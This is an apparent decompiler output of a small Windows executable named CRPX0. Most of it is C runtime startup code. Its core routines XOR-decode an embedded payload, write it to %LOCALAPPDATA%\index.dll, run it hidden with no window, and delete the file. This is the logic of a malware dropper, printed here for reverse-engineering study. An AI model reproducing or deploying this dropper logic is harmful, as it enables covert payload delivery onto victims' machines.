/* Hex-Rays decompilation of CRPX0 */

// ----- nullsub_1 @ 0x401000 -----
void nullsub_1()
{
  ;
}


// ----- start @ 0x4013f0 -----
int __usercall start@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>, char a5)
{
  PVOID StackBase; // ebx
  signed __int32 v6; // eax
  int v7; // esi
  int result; // eax
  BOOL v9; // eax
  __int16 v10; // cx
  int v11; // ebx
  _DWORD *v12; // eax
  int v13; // edx
  int v14; // edi
  const void *Src; // edx
  size_t Size; // esi
  void *v17; // eax
  int v18; // [esp+24h] [ebp-3Ch]
  int v19; // [esp+28h] [ebp-38h]
  int v20; // [esp+2Ch] [ebp-34h]
  _DWORD *v21; // [esp+2Ch] [ebp-34h]
  int v22; // [esp+2Ch] [ebp-34h]
  _DWORD v23[9]; // [esp+3Ch] [ebp-24h] BYREF
  _UNKNOWN *retaddr; // [esp+60h] [ebp+0h]

  dword_7B605C = 1;
  v23[8] = retaddr;
  v23[7] = a2;
  v23[6] = a3;
  v23[5] = a4;
  v23[4] = a1;
  v23[3] = &a5;
  StackBase = NtCurrentTeb()->NtTib.StackBase;
  while ( 1 )
  {
    v6 = _InterlockedCompareExchange(&dword_7B6038, (signed __int32)StackBase, 0);
    if ( v6 == 0 )
    {
      v7 = 0;
      goto LABEL_6;
    }
    if ( StackBase == (PVOID)v6 )
      break;
    Sleep(0x3E8u);
  }
  v7 = 1;
LABEL_6:
  if ( dword_7B603C == 1 )
  {
    result = amsg_exit(31);
    goto LABEL_46;
  }
  if ( dword_7B603C != 0 )
  {
    dword_7B6004 = 1;
  }
  else
  {
    dword_7B603C = 1;
    sub_401C70();
    dword_7B6074 = (int)SetUnhandledExceptionFilter(TopLevelExceptionFilter);
    sub_402980(nullsub_1);
    sub_402480();
    v9 = false;
    dword_7B6050 = 1;
    dword_7B604C = 1;
    dword_7B6048 = 1;
    if ( MEMORY[0x400000] == 23117 && *(_DWORD *)(MEMORY[0x40003C] + 0x400000) == 17744 )
    {
      v10 = *(_WORD *)(MEMORY[0x40003C] + 4194328);
      if ( v10 == 267 )
      {
        if ( *(_DWORD *)(MEMORY[0x40003C] + 4194420) > 0xEu )
          v9 = *(_DWORD *)(MEMORY[0x40003C] + 4194536) != 0;
      }
      else if ( v10 == 523 && *(_DWORD *)(MEMORY[0x40003C] + 4194436) > 0xEu )
      {
        v9 = *(_DWORD *)(MEMORY[0x40003C] + 4194552) != 0;
      }
    }
    dword_7B6008 = v9;
    if ( dword_7B605C != 0 )
      _set_app_type(_crt_gui_app);
    else
      _set_app_type(_crt_console_app);
    *_p__fmode() = dword_7B6070;
    *_p__commode() = dword_7B6058;
    if ( sub_401950() < 0 )
      goto LABEL_37;
    if ( dword_7B38F4 == 1 )
      sub_402010(sub_401A40);
    if ( dword_7B38EC == -1 )
      sub_402990(-1);
    v11 = sub_4028C0(&unk_7B4598, &unk_7B459C);
    if ( v11 != 0 )
      return 255;
    v23[0] = dword_7B6044;
    if ( (int)sub_4028F0(&dword_7B6014, &dword_7B6010, &dword_7B600C, dword_7B6040, v23) < 0
      || (v20 = dword_7B6014, v12 = malloc(4 * dword_7B6014 + 4), v13 = (int)v12, v12 == nullptr) )
    {
LABEL_37:
      result = amsg_exit(8);
      goto LABEL_38;
    }
    if ( v20 > 0 )
    {
      v19 = v20;
      v14 = dword_7B6010;
      v18 = v7;
      v21 = v12;
      do
      {
        Size = strlen(*(const char **)(v14 + 4 * v11)) + 1;
        v17 = malloc(Size);
        v21[v11] = v17;
        if ( v17 == nullptr )
          goto LABEL_37;
        Src = *(const void **)(v14 + 4 * v11++);
        memcpy(v17, Src, Size);
      }
      while ( v19 != v11 );
      v13 = (int)v21;
      v7 = v18;
      v12 = &v21[v19];
    }
    *v12 = 0;
    dword_7B6010 = v13;
    initterm((_PVFV *)&First, (_PVFV *)&Last);
    sub_401930();
    dword_7B603C = 2;
  }
  if ( v7 == 0 )
    _InterlockedExchange(&dword_7B6038, 0);
  if ( TlsCallback_0 != nullptr )
    TlsCallback_0(0, 2, 0);
  *(_DWORD *)_p___initenv() = dword_7B600C;
  result = sub_402A90(dword_7B6014);
  if ( dword_7B6008 == 0 )
LABEL_46:
    exit(result);
  if ( dword_7B6004 == 0 )
  {
LABEL_38:
    v22 = result;
    cexit();
    return v22;
  }
  return result;
}


// ----- j_atexit @ 0x401410 -----
// attributes: thunk
int __cdecl j_atexit(void (__cdecl *a1)())
{
  return atexit(a1);
}


// ----- sub_4014C0 @ 0x4014c0 -----
HMODULE sub_4014C0()
{
  HMODULE result; // eax

  if ( dword_403000 != nullptr )
    dword_403000(&unk_7B50D8);
  result = hLibModule;
  if ( hLibModule != nullptr )
    return (HMODULE)FreeLibrary(hLibModule);
  return result;
}


// ----- sub_4014F0 @ 0x4014f0 -----
int sub_4014F0()
{
  struct _SYSTEMTIME SystemTime; // [esp+18h] [ebp-20h] BYREF
  int v2; // [esp+28h] [ebp-10h]

  v2 = 93294;
  GetSystemTime(&SystemTime);
  GetTickCount();
  return SystemTime.wMilliseconds;
}


// ----- sub_401566 @ 0x401566 -----
int sub_401566()
{
  struct _SYSTEMTIME SystemTime; // [esp+20h] [ebp-28h] BYREF
  int v2; // [esp+30h] [ebp-18h]
  DWORD v3; // [esp+34h] [ebp-14h]
  DWORD j; // [esp+38h] [ebp-10h]
  unsigned int i; // [esp+3Ch] [ebp-Ch]

  for ( i = 0; i <= 0x3F; ++i )
  {
    byte_7B3840[i] ^= byte_7B38C0;
    byte_7B3880[i] ^= byte_7B38C1;
  }
  for ( j = 0; j < nNumberOfBytesToWrite; ++j )
  {
    byte_403020[j] ^= byte_7B3880[j & 0x3F];
    byte_403020[j] = (byte_403020[j] << 7) | (byte_403020[j] >> 1);
    byte_403020[j] = ~byte_403020[j];
    byte_403020[j] ^= byte_7B3840[j & 0x3F];
  }
  v2 = 93294;
  GetSystemTime(&SystemTime);
  v3 = SystemTime.wMilliseconds ^ GetTickCount();
  return sub_4014F0();
}


// ----- sub_4016DB @ 0x4016db -----
int __stdcall sub_4016DB(int a1, int a2, int a3, int a4)
{
  struct _STARTUPINFOA StartupInfo; // [esp+30h] [ebp-168h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+74h] [ebp-124h] BYREF
  DWORD NumberOfBytesWritten; // [esp+84h] [ebp-114h] BYREF
  CHAR Buffer[260]; // [esp+88h] [ebp-110h] BYREF
  HANDLE hFile; // [esp+18Ch] [ebp-Ch]

  GetEnvironmentVariableA("LOCALAPPDATA", Buffer, 0x104u);
  lstrcatA(Buffer, "\\index.dll");
  sub_401566();
  hFile = CreateFileA(Buffer, 0x40000000u, 0, nullptr, 2u, 0x80u, nullptr);
  if ( hFile != (HANDLE)-1 )
  {
    WriteFile(hFile, byte_403020, nNumberOfBytesToWrite, &NumberOfBytesWritten, nullptr);
    CloseHandle(hFile);
    Sleep(3u);
    memset(&StartupInfo, 0, sizeof(StartupInfo));
    StartupInfo.cb = 68;
    CreateProcessA(
      Buffer,
      nullptr,
      nullptr,
      nullptr,
      false,
      0x8000000u,
      nullptr,
      nullptr,
      &StartupInfo,
      &ProcessInformation);
    DeleteFileA(Buffer);
  }
  sub_4014F0();
  return 0;
}


// ----- sub_401870 @ 0x401870 -----
void __cdecl sub_401870()
{
  void (*i)(void); // eax

  for ( i = *(void (**)(void))off_7B38E0; i != nullptr; off_7B38E0 = (_UNKNOWN *)((char *)off_7B38E0 + 4) )
  {
    i();
    i = *((void (**)(void))off_7B38E0 + 1);
  }
}


// ----- sub_4018C0 @ 0x4018c0 -----
int sub_4018C0()
{
  int v0; // ebx
  int v2; // eax

  v2 = 0;
  do
    v0 = v2++;
  while ( dword_7B457C[v2] != 0 );
  for ( ; v0 != 0; --v0 )
    ((void (*)(void))dword_7B457C[v0])();
  return j_atexit(sub_401870);
}


// ----- sub_401930 @ 0x401930 -----
int sub_401930()
{
  int result; // eax

  result = dword_7B6034;
  if ( dword_7B6034 == 0 )
  {
    dword_7B6034 = 1;
    return sub_4018C0();
  }
  return result;
}


// ----- sub_401950 @ 0x401950 -----
int sub_401950()
{
  return 0;
}


// ----- TlsCallback_1 @ 0x401960 -----
int __stdcall TlsCallback_1(int a1, int a2, int a3)
{
  int result; // eax

  result = a2;
  if ( a2 == 3 || a2 == 0 )
    return sub_402370(a1, a2);
  return result;
}


// ----- TlsCallback_0 @ 0x4019a0 -----
int __stdcall TlsCallback_0(int a1, int a2, int a3)
{
  int result; // eax

  result = a2;
  if ( dword_7B38F0 != 2 )
    dword_7B38F0 = 2;
  if ( a2 == 1 )
    return sub_402370(a1, 1);
  return result;
}


// ----- sub_401A30 @ 0x401a30 -----
int sub_401A30()
{
  return 0;
}


// ----- sub_401A40 @ 0x401a40 -----
int __cdecl sub_401A40(int a1)
{
  const char *v1; // ebx
  unsigned int v2; // edx
  const char *v3; // esi
  FILE *Stream; // eax
  double v6; // [esp+38h] [ebp-20h]
  double v7; // [esp+40h] [ebp-18h]
  double v8; // [esp+48h] [ebp-10h]

  v1 = "Unknown error";
  v2 = *(_DWORD *)a1 - 1;
  if ( v2 <= 5 )
    v1 = off_7B4198[v2];
  v3 = *(const char **)(a1 + 4);
  v6 = *(double *)(a1 + 24);
  v7 = *(double *)(a1 + 16);
  v8 = *(double *)(a1 + 8);
  Stream = (FILE *)sub_4029B0(2);
  fprintf(Stream, "_matherr(): %s in %s(%g, %g)  (retval=%g)\n", v1, v3, v8, v7, v6);
  return 0;
}


// ----- sub_401AC0 @ 0x401ac0 -----
void __noreturn sub_401AC0(char *Format, ...)
{
  FILE *Stream; // eax
  FILE *v2; // eax
  va_list va; // [esp+24h] [ebp+Ch] BYREF

  va_start(va, Format);
  Stream = (FILE *)sub_4029B0(2);
  fprintf(Stream, "Mingw-w64 runtime failure:\n");
  v2 = (FILE *)sub_4029B0(2);
  vfprintf(v2, Format, va);
  abort();
}


// ----- sub_401B10 @ 0x401b10 -----
_DWORD *__usercall sub_401B10@<eax>(const void *a1@<eax>)
{
  int v2; // ebx
  int v3; // ecx
  _DWORD *result; // eax
  int v5; // edi
  int v6; // ebx
  _DWORD *v7; // eax
  const void *lpAddress; // eax
  DWORD v9; // eax
  SIZE_T RegionSize; // ecx
  PVOID BaseAddress; // edx
  DWORD *lpflOldProtect; // ebx
  DWORD LastError; // eax
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+14h] [ebp-34h] BYREF

  v2 = dword_7B6064;
  if ( dword_7B6064 <= 0 )
  {
    v2 = 0;
LABEL_6:
    v5 = sub_4025B0(a1);
    if ( v5 == 0 )
      sub_401AC0("Address %p has no image-section", a1);
    v6 = 20 * v2;
    v7 = (_DWORD *)(v6 + dword_7B6068);
    v7[4] = v5;
    *v7 = 0;
    lpAddress = (const void *)(*(_DWORD *)(v5 + 12) + sub_4026F0());
    *(_DWORD *)(dword_7B6068 + v6 + 12) = lpAddress;
    if ( VirtualQuery(lpAddress, &Buffer, 0x1Cu) == 0 )
      sub_401AC0(
        "  VirtualQuery failed for %d bytes at address %p",
        *(_DWORD *)(v5 + 8),
        *(const void **)(dword_7B6068 + v6 + 12));
    result = (_DWORD *)Buffer.Protect;
    if ( ((Buffer.Protect - 4) & 0xFFFFFFFB) != 0 && ((Buffer.Protect - 64) & 0xFFFFFFBF) != 0 )
    {
      v9 = 64;
      RegionSize = Buffer.RegionSize;
      if ( Buffer.Protect == 2 )
        v9 = 4;
      BaseAddress = Buffer.BaseAddress;
      lpflOldProtect = (DWORD *)(dword_7B6068 + v6);
      lpflOldProtect[2] = Buffer.RegionSize;
      lpflOldProtect[1] = (DWORD)BaseAddress;
      result = (_DWORD *)VirtualProtect(BaseAddress, RegionSize, v9, lpflOldProtect);
      if ( result == nullptr )
      {
        LastError = GetLastError();
        sub_401AC0("  VirtualProtect failed with code 0x%x", LastError);
      }
    }
    ++dword_7B6064;
  }
  else
  {
    v3 = 0;
    result = (_DWORD *)(dword_7B6068 + 12);
    while ( (unsigned int)a1 < *result || (unsigned int)a1 >= *(_DWORD *)(result[1] + 8) + *result )
    {
      ++v3;
      result += 5;
      if ( v3 == dword_7B6064 )
        goto LABEL_6;
    }
  }
  return result;
}


// ----- sub_401C70 @ 0x401c70 -----
void sub_401C70()
{
  void *v0; // esp
  int v1; // [esp+20h] [ebp-38h] BYREF

  if ( dword_7B6060 == 0 )
  {
    dword_7B6060 = 1;
    sub_402630();
    v0 = alloca(sub_402890());
    dword_7B6064 = 0;
    dword_7B6068 = (int)&v1;
  }
}


// ----- sub_401FC0 @ 0x401fc0 -----
int (__cdecl *__cdecl sub_401FC0(int a1, int a2, double a3, double a4, double a5))(_DWORD)
{
  int (__cdecl *result)(_DWORD); // eax
  _DWORD v6[2]; // [esp+10h] [ebp-28h] BYREF
  double v7; // [esp+18h] [ebp-20h]
  double v8; // [esp+20h] [ebp-18h]
  double v9; // [esp+28h] [ebp-10h]

  result = dword_7B606C;
  if ( dword_7B606C != nullptr )
  {
    v7 = a3;
    v8 = a4;
    v6[0] = a1;
    v9 = a5;
    v6[1] = a2;
    return (int (__cdecl *)(_DWORD))dword_7B606C(v6);
  }
  return result;
}


// ----- sub_402010 @ 0x402010 -----
void __cdecl sub_402010(_UserMathErrorFunctionPointer UserMathErrorFunction)
{
  dword_7B606C = (int (__cdecl *)(_DWORD))UserMathErrorFunction;
  _setusermatherr(UserMathErrorFunction);
}


// ----- TopLevelExceptionFilter @ 0x402030 -----
LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  DWORD ExceptionCode; // eax
  _crt_signal_t v2; // eax
  _crt_signal_t v4; // eax
  _crt_signal_t v5; // eax

  ExceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
  if ( ExceptionCode == -1073741677 )
  {
LABEL_17:
    v5 = signal(8, nullptr);
    if ( v5 == (_crt_signal_t)1 )
    {
      signal(8, (_crt_signal_t)1);
      sub_402480();
      return -1;
    }
    goto LABEL_18;
  }
  if ( ExceptionCode > 0xC0000093 )
  {
    if ( ExceptionCode == -1073741676 )
    {
      v5 = signal(8, nullptr);
      if ( v5 == (_crt_signal_t)1 )
      {
        signal(8, (_crt_signal_t)1);
        return -1;
      }
LABEL_18:
      if ( v5 != nullptr )
      {
        v5(8);
        return -1;
      }
      goto LABEL_8;
    }
    if ( ExceptionCode != -1073741674 )
      goto LABEL_8;
  }
  else if ( ExceptionCode != -1073741795 )
  {
    if ( ExceptionCode <= 0xC000001D )
    {
      if ( ExceptionCode != -1073741819 )
        goto LABEL_8;
      v2 = signal(11, nullptr);
      if ( v2 == (_crt_signal_t)1 )
      {
        signal(11, (_crt_signal_t)1);
      }
      else
      {
        if ( v2 == nullptr )
          goto LABEL_8;
        v2(11);
      }
      return -1;
    }
    if ( ExceptionCode + 1073741683 <= 4 )
      goto LABEL_17;
LABEL_8:
    if ( dword_7B6074 != nullptr )
      return dword_7B6074(ExceptionInfo);
    else
      return 0;
  }
  v4 = signal(4, nullptr);
  if ( v4 == (_crt_signal_t)1 )
  {
    signal(4, (_crt_signal_t)1);
    return -1;
  }
  if ( v4 != nullptr )
  {
    v4(4);
    return -1;
  }
  goto LABEL_8;
}


// ----- sub_4021E0 @ 0x4021e0 -----
void sub_4021E0()
{
  DWORD *v0; // ebx
  LPVOID Value; // esi
  DWORD LastError; // eax

  EnterCriticalSection(&CriticalSection);
  v0 = (DWORD *)Block;
  if ( Block != nullptr )
  {
    do
    {
      Value = TlsGetValue(*v0);
      LastError = GetLastError();
      if ( Value != nullptr && LastError == 0 )
        ((void (__cdecl *)(LPVOID))v0[1])(Value);
      v0 = (DWORD *)v0[2];
    }
    while ( v0 != nullptr );
  }
  LeaveCriticalSection(&CriticalSection);
}


// ----- sub_402370 @ 0x402370 -----
int __cdecl sub_402370(int a1, unsigned int a2)
{
  _DWORD *Block; // eax
  _DWORD *v4; // [esp+1Ch] [ebp-Ch]

  if ( a2 == 2 )
  {
    sub_402480();
    return 1;
  }
  else
  {
    if ( a2 > 2 )
    {
      if ( a2 == 3 && dword_7B607C != 0 )
        sub_4021E0();
    }
    else if ( a2 != 0 )
    {
      if ( dword_7B607C == 0 )
        InitializeCriticalSection(&CriticalSection);
      dword_7B607C = 1;
    }
    else
    {
      if ( dword_7B607C != 0 )
        sub_4021E0();
      if ( dword_7B607C == 1 )
      {
        Block = ::Block;
        if ( ::Block != nullptr )
        {
          do
          {
            v4 = (_DWORD *)Block[2];
            free(Block);
            Block = v4;
          }
          while ( v4 != nullptr );
        }
        ::Block = nullptr;
        dword_7B607C = 0;
        DeleteCriticalSection(&CriticalSection);
      }
    }
    return 1;
  }
}


// ----- sub_402480 @ 0x402480 -----
void sub_402480()
{
  __asm { fninit }
}


// ----- sub_402490 @ 0x402490 -----
BOOL __cdecl sub_402490(int a1)
{
  int v1; // eax

  return *(_WORD *)a1 == 23117 && *(_DWORD *)(v1 = *(_DWORD *)(a1 + 60) + a1) == 17744 && *(_WORD *)(v1 + 24) == 267;
}


// ----- sub_4025B0 @ 0x4025b0 -----
int __cdecl sub_4025B0(int a1)
{
  int result; // eax
  int v2; // esi
  int v3; // ecx
  unsigned int v4; // ebx
  unsigned int v5; // edx

  result = 0;
  if ( MEMORY[0x400000] == 23117
    && *(_DWORD *)(MEMORY[0x40003C] + 0x400000) == 17744
    && *(_WORD *)(MEMORY[0x40003C] + 4194328) == 267 )
  {
    v2 = *(unsigned __int16 *)(MEMORY[0x40003C] + 4194310);
    if ( (_WORD)v2 != 0 )
    {
      v3 = 0;
      v4 = a1 - 0x400000;
      for ( result = MEMORY[0x40003C] + *(unsigned __int16 *)(MEMORY[0x40003C] + 4194324) + 4194328; ; result += 40 )
      {
        v5 = *(_DWORD *)(result + 12);
        if ( v4 >= v5 && v4 < *(_DWORD *)(result + 8) + v5 )
          break;
        if ( v2 == ++v3 )
          return 0;
      }
    }
  }
  return result;
}


// ----- sub_402630 @ 0x402630 -----
int sub_402630()
{
  int result; // eax

  result = 0;
  if ( MEMORY[0x400000] == 23117
    && *(_DWORD *)(MEMORY[0x40003C] + 0x400000) == 17744
    && *(_WORD *)(MEMORY[0x40003C] + 4194328) == 267 )
  {
    return *(unsigned __int16 *)(MEMORY[0x40003C] + 4194310);
  }
  return result;
}


// ----- sub_402670 @ 0x402670 -----
int __cdecl sub_402670(int a1)
{
  int result; // eax
  int v3; // ebx
  int i; // edx

  result = 0;
  if ( MEMORY[0x400000] == 23117
    && *(_DWORD *)(MEMORY[0x40003C] + 0x400000) == 17744
    && *(_WORD *)(MEMORY[0x40003C] + 4194328) == 267 )
  {
    v3 = *(unsigned __int16 *)(MEMORY[0x40003C] + 4194310);
    if ( (_WORD)v3 != 0 )
    {
      result = MEMORY[0x40003C] + *(unsigned __int16 *)(MEMORY[0x40003C] + 4194324) + 4194328;
      for ( i = 0; i != v3; ++i )
      {
        if ( (*(_BYTE *)(result + 39) & 0x20) != 0 )
        {
          if ( a1 == 0 )
            return result;
          --a1;
        }
        result += 40;
      }
      return 0;
    }
  }
  return result;
}


// ----- sub_4026F0 @ 0x4026f0 -----
int sub_4026F0()
{
  int result; // eax

  result = 0;
  if ( MEMORY[0x400000] == 23117
    && *(_DWORD *)(MEMORY[0x40003C] + 0x400000) == 17744
    && *(_WORD *)(MEMORY[0x40003C] + 4194328) == 267 )
  {
    return 0x400000;
  }
  return result;
}


// ----- sub_4027C0 @ 0x4027c0 -----
int __cdecl sub_4027C0(int a1)
{
  unsigned int v3; // eax
  int v4; // edi
  int v5; // esi
  int i; // edx
  unsigned int v7; // ecx
  unsigned int j; // eax

  if ( MEMORY[0x400000] != 23117 )
    return 0;
  if ( *(_DWORD *)(MEMORY[0x40003C] + 0x400000) != 17744 )
    return 0;
  if ( *(_WORD *)(MEMORY[0x40003C] + 4194328) != 267 )
    return 0;
  v3 = *(_DWORD *)(MEMORY[0x40003C] + 4194432);
  if ( v3 == 0 )
    return 0;
  v4 = *(unsigned __int16 *)(MEMORY[0x40003C] + 4194310);
  if ( (_WORD)v4 == 0 )
    return 0;
  v5 = 0;
  for ( i = MEMORY[0x40003C] + *(unsigned __int16 *)(MEMORY[0x40003C] + 4194324) + 4194328; ; i += 40 )
  {
    v7 = *(_DWORD *)(i + 12);
    if ( v3 >= v7 && v3 < *(_DWORD *)(i + 8) + v7 )
      break;
    if ( v4 == ++v5 )
      return 0;
  }
  for ( j = v3 + 0x400000; *(_DWORD *)(j + 4) != 0 || *(_DWORD *)(j + 12) != 0; j += 20 )
  {
    if ( a1 <= 0 )
      return *(_DWORD *)(j + 12) + 0x400000;
    --a1;
  }
  return 0;
}


// ----- sub_402890 @ 0x402890 -----
unsigned int __usercall sub_402890@<eax>(unsigned int a1@<eax>, int a2@<ecx>, char a3)
{
  char *v3; // ecx
  unsigned int v5; // [esp-8h] [ebp-8h]
  int v6; // [esp-4h] [ebp-4h]

  v6 = a2;
  v5 = a1;
  v3 = &a3;
  if ( a1 >= 0x1000 )
  {
    do
    {
      v3 -= 4096;
      *(_DWORD *)v3 = *(_DWORD *)v3;
      a1 -= 4096;
    }
    while ( a1 > 0x1000 );
  }
  *(_DWORD *)&v3[-a1] = *(_DWORD *)&v3[-a1];
  return v5;
}


// ----- sub_4028C0 @ 0x4028c0 -----
int __cdecl sub_4028C0(int (**a1)(void), unsigned int a2)
{
  int (**v2)(void); // ebx
  int result; // eax

  v2 = a1;
  if ( (unsigned int)a1 >= a2 )
    return 0;
  while ( 1 )
  {
    if ( *v2 != nullptr )
    {
      result = (*v2)();
      if ( result != 0 )
        break;
    }
    if ( (unsigned int)++v2 >= a2 )
      return 0;
  }
  return result;
}


// ----- sub_4028F0 @ 0x4028f0 -----
int __cdecl sub_4028F0(int *a1, _DWORD *a2, _DWORD *a3, int a4, int a5)
{
  int result; // eax
  int v6; // edx
  int v7; // ecx
  int v8; // [esp+24h] [ebp-14h] BYREF
  int v9; // [esp+28h] [ebp-10h] BYREF
  int v10; // [esp+2Ch] [ebp-Ch] BYREF

  v8 = -1;
  v9 = 0;
  v10 = 0;
  _getmainargs(&v8, &v9, &v10, a4, a5);
  result = v8;
  if ( v8 != -1 )
  {
    v6 = v9;
    if ( v9 != 0 && (v7 = v10, v10 != 0) )
    {
      *a1 = v8;
      *a2 = v6;
      *a3 = v7;
      return 0;
    }
    else
    {
      return -1;
    }
  }
  return result;
}


// ----- sub_402970 @ 0x402970 -----
int sub_402970()
{
  return dword_7B60AC;
}


// ----- sub_402980 @ 0x402980 -----
__int32 __cdecl sub_402980(__int32 a1)
{
  return _InterlockedExchange(&dword_7B60AC, a1);
}


// ----- sub_402990 @ 0x402990 -----
int __cdecl sub_402990(int a1)
{
  if ( a1 == 1 )
    return -1;
  else
    return 2;
}


// ----- sub_4029B0 @ 0x4029b0 -----
FILE *__cdecl sub_4029B0(int a1)
{
  return &_p__iob()[a1];
}


// ----- __p__iob @ 0x4029d0 -----
// attributes: thunk
FILE *__cdecl _p__iob()
{
  return __p__iob();
}


// ----- __p___initenv @ 0x4029d8 -----
// attributes: thunk
int _p___initenv(void)
{
  return __p___initenv();
}


// ----- __p__acmdln @ 0x4029e0 -----
// attributes: thunk
char **__cdecl _p__acmdln()
{
  return __p__acmdln();
}


// ----- __p__commode @ 0x4029e8 -----
// attributes: thunk
int *__cdecl _p__commode()
{
  return __p__commode();
}


// ----- __p__fmode @ 0x4029f0 -----
// attributes: thunk
int *__cdecl _p__fmode()
{
  return __p__fmode();
}


// ----- __set_app_type @ 0x4029f8 -----
// attributes: thunk
void __cdecl _set_app_type(_crt_app_type Type)
{
  __set_app_type(Type);
}


// ----- __setusermatherr @ 0x402a00 -----
// attributes: thunk
void __cdecl _setusermatherr(_UserMathErrorFunctionPointer UserMathErrorFunction)
{
  __setusermatherr(UserMathErrorFunction);
}


// ----- _amsg_exit @ 0x402a08 -----
// attributes: thunk
int __cdecl amsg_exit(int a1)
{
  return _amsg_exit(a1);
}


// ----- _cexit @ 0x402a10 -----
// attributes: thunk
void __cdecl cexit()
{
  _cexit();
}


// ----- _initterm @ 0x402a18 -----
// attributes: thunk
void __cdecl initterm(_PVFV *First, _PVFV *Last)
{
  _initterm(First, Last);
}


// ----- _ismbblead @ 0x402a20 -----
// attributes: thunk
int __cdecl ismbblead(unsigned int Ch)
{
  return _ismbblead(Ch);
}


// ----- atexit @ 0x402a28 -----
// attributes: thunk
int __cdecl atexit(void (__cdecl *a1)())
{
  return __imp_atexit(a1);
}


// ----- abort @ 0x402a30 -----
// attributes: thunk
void __cdecl __noreturn abort()
{
  __imp_abort();
}


// ----- calloc @ 0x402a38 -----
// attributes: thunk
void *__cdecl calloc(size_t Count, size_t Size)
{
  return __imp_calloc(Count, Size);
}


// ----- exit @ 0x402a40 -----
// attributes: thunk
void __cdecl __noreturn exit(int Code)
{
  __imp_exit(Code);
}


// ----- free @ 0x402a50 -----
// attributes: thunk
void __cdecl free(void *Block)
{
  __imp_free(Block);
}


// ----- malloc @ 0x402a58 -----
// attributes: thunk
void *__cdecl malloc(size_t Size)
{
  return __imp_malloc(Size);
}


// ----- memcpy @ 0x402a60 -----
// attributes: thunk
void *__cdecl memcpy(void *a1, const void *Src, size_t Size)
{
  return __imp_memcpy(a1, Src, Size);
}


// ----- signal @ 0x402a68 -----
// attributes: thunk
_crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function)
{
  return __imp_signal(Signal, Function);
}


// ----- strlen @ 0x402a70 -----
// attributes: thunk
size_t __cdecl strlen(const char *Str)
{
  return __imp_strlen(Str);
}


// ----- strncmp @ 0x402a78 -----
// attributes: thunk
int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount)
{
  return __imp_strncmp(Str1, Str2, MaxCount);
}


// ----- vfprintf @ 0x402a80 -----
// attributes: thunk
int __cdecl vfprintf(FILE *const Stream, const char *const Format, va_list ArgList)
{
  return __imp_vfprintf(Stream, Format, ArgList);
}


// ----- __getmainargs @ 0x402a88 -----
// attributes: thunk
int __cdecl _getmainargs(int a1, int a2, int a3, int a4, int a5)
{
  return __getmainargs(a1, a2, a3, a4, a5);
}


// ----- sub_402A90 @ 0x402a90 -----
int __cdecl sub_402A90(char a1)
{
  char v1; // si
  char *v2; // ebx
  char v3; // al
  char v4; // al
  int wShowWindow; // eax
  struct _STARTUPINFOA StartupInfo; // [esp+1Ch] [ebp-5Ch] BYREF
  char *v8; // [esp+6Ch] [ebp-Ch]

  v1 = 0;
  v8 = &a1;
  sub_401930();
  v2 = *_p__acmdln();
  if ( v2 != nullptr )
  {
    while ( 1 )
    {
      v3 = *v2;
      if ( *v2 <= 32 )
      {
        if ( v3 == 0 )
          goto LABEL_15;
        if ( (v1 & 1) == 0 )
        {
          do
            v4 = *++v2;
          while ( v4 != 0 && v4 <= 32 );
          goto LABEL_15;
        }
        v1 = 1;
      }
      else if ( v3 == 34 )
      {
        v1 ^= 1u;
      }
      if ( ismbblead(*v2) != 0 )
        v2 += -(v2[1] == 0) + 1;
      ++v2;
    }
  }
  v2 = (char *)&unk_7B405C;
LABEL_15:
  GetStartupInfoA(&StartupInfo);
  wShowWindow = StartupInfo.wShowWindow;
  if ( (StartupInfo.dwFlags & 1) == 0 )
    wShowWindow = 10;
  return sub_4016DB(0x400000, 0, (int)v2, wShowWindow);
}


